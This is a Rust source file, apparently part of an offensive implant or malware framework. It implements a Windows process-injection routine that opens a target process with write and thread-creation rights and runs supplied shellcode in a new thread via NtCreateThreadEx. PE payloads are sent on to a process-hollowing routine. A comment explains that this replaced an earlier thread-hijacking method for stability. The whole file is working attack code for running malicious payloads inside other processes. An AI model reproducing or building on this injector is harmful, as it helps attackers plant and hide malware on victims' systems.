use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct NtCreateThreadInjector;

#[cfg(windows)]
impl Injector for NtCreateThreadInjector {
    /// Inject shellcode into a target process.
    ///
    /// The original implementation suspended an existing thread, redirected its
    /// RIP, and appended a `push <orig_rip> / ret` trampoline so execution would
    /// resume normally after the shellcode returned.  The trampoline assumption is
    /// fragile: shellcodes that loop forever or call `ExitThread` never reach the
    /// trampoline, leaving the hijacked thread in an undefined state and destabilising
    /// the target process (L-06 fix).
    ///
    /// Replacement: allocate a fresh thread via `NtCreateThreadEx` that starts
    /// directly at the shellcode.  The target process's other threads are never
    /// touched, eliminating the return assumption entirely.
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // Forward PE payloads to process hollowing.
        if payload_has_valid_pe_headers(payload) {
            tracing::info!(
                "PE payload detected, forwarding to process hollowing's inject_into_process"
            );
            return match hollowing::windows_impl::inject_into_process(pid, payload) {
                Ok(_) => Ok(()),
                Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
            };
        }

        use windows_sys::Win32::System::Threading::{
            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
            PROCESS_VM_WRITE,
        };
        let access_mask = PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION;

        crate::injection::nt_create_thread_inject(pid, payload, access_mask, "NtCreateThread")
    }
}

#[cfg(not(windows))]
impl Injector for NtCreateThreadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!(
            "NtCreateThread injection only supported on Windows"
        ))
    }
}
